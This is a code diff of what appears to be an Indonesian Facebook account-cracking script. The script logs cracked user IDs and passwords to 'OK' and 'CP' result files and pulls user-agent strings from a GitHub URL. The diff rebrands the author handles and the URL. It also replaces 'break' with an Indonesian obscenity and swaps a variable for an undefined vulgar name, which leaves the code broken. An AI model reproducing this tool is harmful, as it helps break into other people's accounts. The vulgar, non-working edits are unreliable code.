@@ -583,7 +583,7 @@ if __name__ == '__main__':
 	os.system("git pull")
 	login()# -*- coding: utf-8
 # coded by >Nikyi.py_</a>
-# fb.me/gaaaarzxd
+# fb.me nikyi.py
 # instagram.com/nikipratama307
 # open source, tidak di perjual belikan
 
@@ -1032,7 +1032,7 @@ def reaction():
 					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
 					save.close()
-					break
+					Ngentot
 					continue
 				if 'checkpoint' in xo:
 					try:
@@ -1111,12 +1111,12 @@ def manual():
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print('\r  \033[0;93m* --> ' +uid+ '|' + asu + '       ')
+					print('\r  \033[0;93m* --> ' +uid+ '|' + kontol + '       ')
 					cp.append(uid+'|'+asu)
 					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write('  * --> '+str(uid)+'|'+str(asu)+'\n')
 					save.close()
-					break
+					Ngentot
 					continue
 			
 			loop += 1
@@ -1145,7 +1145,7 @@ def settua():
 			exit()
 	elif ask == "t" or ask == "T":
 		try:
-			ua = s.get("https://raw.githubusercontent.com/avsid/data-anggaxd/main/ua.txt").text.strip()
+			ua = s.get("https://raw.githubusercontent.com/avsid/data-Nikicrk.x/main/ua.txt").text.strip()
 			uas = open(".ua","w")
 			uas.write(ua) 
 			uas.close()
